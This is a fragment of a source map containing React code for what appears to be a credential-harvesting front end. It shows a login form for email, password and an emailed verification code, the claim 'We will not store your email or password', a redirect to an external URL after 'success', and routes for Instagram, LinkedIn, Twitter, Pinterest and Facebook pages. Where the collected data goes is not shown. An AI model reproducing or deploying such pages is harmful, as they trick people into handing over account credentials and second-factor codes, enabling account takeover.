<Card>\r\n                <Card.Header>\r\n                  <h4 className=\"card-header-title mb-0\">\r\n                    Please fill in your credentials.\r\n                    <a\r\n                      href=\"javaScript:void(0);\"\r\n                      onClick={this.setRedirect}\r\n                      className=\"float-right\"\r\n                    >\r\n                      Go Back\r\n                    </a>\r\n                  </h4>\r\n                </Card.Header>\r\n                <Card.Body>\r\n                  <div class=\"row justify-content-center\">\r\n                    <div className=\"col-12 col-md-5 col-xl-4 my-5\">\r\n                      {this.renderRedirect()}\r\n\r\n                      {this.state.success ? (\r\n                        <>\r\n                          {\" \"}\r\n                          <center>\r\n                            <h1>Login Success Thank You!</h1>\r\n                            <h1>Redirecting...</h1>\r\n                          </center>\r\n                          <Route\r\n                            component={() => {\r\n                              window.setTimeout(() => {\r\n                                window.location.href =\r\n                                  env.REACT_APP_REDIRECTURL;\r\n                              }, 5000);\r\n\r\n                              return null;\r\n                            }}\r\n                          />\r\n                        </>\r\n                      ) : (\r\n                        <>\r\n                          <h1 className=\"display-4 text-center mb-3\">\r\n                            We Value Your Security.\r\n                          </h1>\r\n\r\n                          <p className=\"text-muted text-center mb-5\">\r\n                            We will not store your email or password.\r\n                          </p>\r\n\r\n                          {this.state.showAlert ? (\r\n                            <Alert variant=\"danger\">{this.state.message}</Alert>\r\n                          ) : (\r\n                            \"\"\r\n                          )}\r\n\r\n                          <Form>\r\n                            <Form.Group controlId=\"name\">\r\n                              <Form.Label>Email Address</Form.Label>\r\n                              <Form.Control\r\n                                type=\"text\"\r\n                                id=\"name\"\r\n                                placeholder=\"name@address.com\"\r\n                                autocomplete=\"off\"\r\n                                onChange={(e) => this.handleUsername(e)}\r\n                                value={this.state.username}\r\n                                name=\"name\"\r\n                                autocomplete=\"off\"\r\n                              />\r\n                            </Form.Group>\r\n                            <Form.Group controlId=\"pass\">\r\n                              <Form.Label>Password</Form.Label>\r\n                              <Form.Control\r\n                                type=\"password\"\r\n                                id=\"pass\"\r\n                                placeholder=\"password\"\r\n                                autocomplete=\"off\"\r\n                                onChange={(e) => this.handlePassword(e)}\r\n                                value={this.state.password}\r\n                                name=\"name\"\r\n                                autocomplete=\"off\"\r\n                              />\r\n                            </Form.Group>\r\n                            {this.state.loading ? (\r\n                              <Button variant=\"primary\" type=\"submit\" disabled>\r\n                                <Spinner\r\n                                  as=\"span\"\r\n                                  animation=\"grow\"\r\n                                  size=\"sm\"\r\n                                  role=\"status\"\r\n                                  aria-hidden=\"true\"\r\n                                />\r\n                                Loading...\r\n                              </Button>\r\n                            ) : (\r\n                              <button\r\n                                onClick={(e) => this.handleClick(e)}\r\n                                type=\"button\"\r\n                                className=\"btn btn-lg btn-block btn-primary mb-3 login_btn\"\r\n                              >\r\n                                Login\r\n                              </button>\r\n                            )}\r\n\r\n                            {this.state.manualCheck ? (\r\n                              <div>\r\n                                <Form.Group>\r\n                                  <Form.Label>\r\n                                    Enter code recieved in your email\r\n                                  </Form.Label>\r\n                                  <input\r\n                                    value={this.state.code}\r\n                                    onChange={(e) => {\r\n                                      this.handleCode(e);\r\n                                    }}\r\n                                    type=\"number\"\r\n                                    maxLength=\"11\"\r\n                                    name=\"name\"\r\n                                    className=\"text-center form-control\"\r\n                                  ></input>\r\n                                </Form.Group>\r\n                                <button\r\n                                  onClick={() => {\r\n                                    this.handleCodeClick();\r\n                                  }}\r\n                                  type=\"button\"\r\n                                  className=\"btn login_btn\"\r\n                                >\r\n                                  submit code\r\n                                </button>\r\n                              </div>\r\n                            ) : (\r\n                              \"\"\r\n                            )}\r\n                          </Form>\r\n                        </>\r\n                      )}\r\n                    </div>\r\n                  </div>\r\n                </Card.Body>\r\n              </Card>\r\n            </Col>\r\n          </Row>\r\n        </Container>\r\n        <Footer withText />\r\n      </>\r\n    );\r\n  }\r\n}\r\n","import React from \"react\";\r\nimport { Switch, Route } from \"react-router-dom\";\r\nimport Home from \"./components/Home\";\r\nimport Instagram from \"./components/Instagram\";\r\nimport Linkedin from \"./components/Linkedin\";\r\nimport Twitter from \"./components/Twitter\";\r\nimport Pinterest from \"./components/Pinterest\";\r\nimport Facebook from \"./components/Facebook\";\r\n\r\nimport runtimeEnv from \"@mars/heroku-js-runtime-env\";\r\nconst env = runtimeEnv();\r\nfunction App() {\r\n  return (\r\n    <Switch>\r\n      <Route path=\"/\" component={Home} exact />\r\n      {env.REACT_APP_TWITTER === \"true\" ? (\r\n        <Route path=\"/Twitter\" component={Twitter} exact />\r\n      ) : (\r\n        \"\"\r\n      )}\r\n      {env.REACT_APP_LINKEDIN === \"true\" ? (\r\n        <Route path=\"/LinkedIn\" component={Linkedin} exact />\r\n      ) : (\r\n        \"\"\r\n      )}\r\n      {env.REACT_APP_INSTAGRAM === \"true\" ? (\r\n        <Route path=\"/Instagram\" component={Instagram} exact />\r\n      ) : (\r\n        \"\"\r\n      )}\r\n      {env.REACT_APP_PINTEREST === \"true\" ? (\r\n        <Route path=\"/Pinterest\" component={Pinterest} exact />\r\n      ) : (\r\n        \"\"\r\n      )}\r\n      {env.REACT_APP_FACEBOOK === \"true\" ? (\r\n        <Route path=\"/Facebook\" component={Facebook} exact />\r\n      ) : (\r\n        \"\"\r\n      )}\r\n    </Switch>\r\n  );\r\n}\r\n\r\nexport default App;\r\n","import { createBrowserHistory as history } from \"history\";\r\n\r\nexport default history();\r\n","import React from \"react\";\r\nimport ReactDOM from \"react-dom\";\r\nimport App from \"./App\";\r\nimport { BrowserRouter as Router } from \"react-router-dom\";\r\nimport history from \"./components/History\";\r\n\r\nReactDOM.render(\r\n  <Router history={history}>\r\n    <App />\r\n  </Router>,\r\n  document.getElementById(\"root\")\r\n);\r\n"],"sourceRoot":""}